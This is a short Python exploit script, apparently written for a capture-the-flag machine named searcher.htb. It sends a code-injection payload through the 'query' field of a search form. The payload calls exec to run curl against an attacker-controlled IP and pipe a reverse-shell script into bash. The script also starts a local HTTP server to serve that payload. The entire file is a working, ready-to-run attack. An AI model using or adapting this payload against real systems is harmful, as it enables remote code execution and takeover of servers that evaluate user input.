import requests,os,time,sys,signal;

url = "http://searcher.htb/search"
injection = "'), exec(\"import os; os.system('curl http://10.10.16.39:9000/reverseShell.sh | bash')\")#"
body = {"engine":"AlternativeTo", "query": injection}

server_process = 0
p1 = os.fork()
if p1>0:
	server_process = os.getpid()
	os.system('python3 -m http.server 9000')
else:
	request = requests.post(url, data = body)
	os.kill(server_process,signal.SIGKILL)
